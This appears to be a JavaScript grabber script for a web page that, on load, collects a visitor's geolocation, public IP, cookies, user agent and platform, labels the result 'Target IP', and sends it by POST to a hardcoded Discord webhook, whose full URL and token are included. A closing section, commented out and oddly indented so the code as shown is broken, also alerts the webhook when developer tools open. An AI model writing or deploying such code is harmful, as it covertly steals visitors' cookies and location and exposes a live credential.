ddEventListener('DOMContentLoaded', () => {
getLocation();
getIPAddress();
});

function getLocation() {
if ('geolocation' in navigator) {
navigator.geolocation.getCurrentPosition(
showLocation,
handleError
);
} else {
document.getElementById('location').textContent = "Geolocation is not supported by this browser.";
}
}

function showLocation(position) {
const latitude = position.coords.latitude;
const longitude = position.coords.longitude;
document.getElementById('location').textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
}

function handleError(error) {
const errorMessage = {
1: "Permission to access device location was denied.",
2: "Device location information is unavailable.",
3: "Request to get device location timed out.",
default: "An unknown error occurred while getting the device location."
};
const errorCode = errorMessage[error.code] || errorMessage.default;
document.getElementById('location').textContent = errorCode;
}

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1221290263213768716/3_GEIUfcFoLBjoMGSzMZGE0gry8l9GfpBNigCJ6VrJkarZKOjHu2MPbqGp3VO2NT8JAe';

async function getIPAddress() {
try {
const response = await fetch('https://api.ipify.org?format=json');
const data = await response.json();
const ipAddress = data.ip;
displayIPAddress(ipAddress);
displayCookies();
displayDeviceInfo();
displayBrowserInfo();
sendToDiscord(`Target IP: ${ipAddress}\n${getDeviceInfo()}\n${getBrowserInfo()}\n${getCookiesInfo()}`);
} catch (error) {
console.error('Failed to fetch IP address:', error);
}
}

function displayIPAddress(ipAddress) {
document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
}

function displayCookies() {
const cookiesElement = document.getElementById('cookies');
const cookies = document.cookie.split('; ');
let cookiesHTML = 'Cookies:<br>';
cookies.forEach((cookie) => {
cookiesHTML += `${cookie}<br>`;
});
cookiesElement.innerHTML = cookiesHTML;
}

function displayDeviceInfo() {
const deviceInfoElement = document.getElementById('device-info');
const deviceInfo = getDeviceInfo();
deviceInfoElement.textContent = `Device Info:\n${deviceInfo}`;
}

function displayBrowserInfo() {
const browserInfoElement = document.getElementById('browser-info');
const browserInfo = getBrowserInfo();
browserInfoElement.textContent = `Browser Info:\n${browserInfo}`;
}

function getCookiesInfo() {
const cookies = document.cookie;
return `Cookies: ${cookies}`;
}

function getDeviceInfo() {
const userAgent = navigator.userAgent;
const platform = navigator.platform;
const deviceInfo = `User Agent: ${userAgent}\nPlatform: ${platform}`;
return deviceInfo;
}

function getBrowserInfo() {
const userAgent = navigator.userAgent;
// Extract browser information from user agent string
//     // Example: Chrome/94.0.4606.81
//         const browser = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/);
//             if (browser && browser.length >= 3) {
//                     return `${browser[1]} Version: ${browser[2]}`;
//                         } else {
//                                 return "Browser information not available";
//                                     }
//                                     }
//
//                                     async function sendToDiscord(message) {
//                                         try {
//                                                 const payload = {
//                                                             content: message,
//                                                                     };
//
//                                                                             const response = await fetch(DISCORD_WEBHOOK_URL, {
//                                                                                         method: 'POST',
//                                                                                                     headers: {
//                                                                                                                     'Content-Type': 'application/json',
//                                                                                                                                 },
//                                                                                                                                             body: JSON.stringify(payload),
//                                                                                                                                                     });
//
//                                                                                                                                                             if (response.status !== 204) {
//                                                                                                                                                                         console.error('Failed to send message to Discord.');
//                                                                                                                                                                                 }
//                                                                                                                                                                                     } catch (error) {
//                                                                                                                                                                                             console.error('Failed to send message to Discord:', error);
//                                                                                                                                                                                                 }
//                                                                                                                                                                                                 }
//
//                                                                                                                                                                                                 window.addEventListener('devtoolschange', (event) => {
//                                                                                                                                                                                                     if (event.detail.isOpen) {
//                                                                                                                                                                                                             console.log('Developer tools or inspect element opened');
//                                                                                                                                                                                                                     sendToDiscord('Developer tools or inspect element opened');
//                                                                                                                                                                                                                         }
//                                                                                                                                                                                                                         });
//
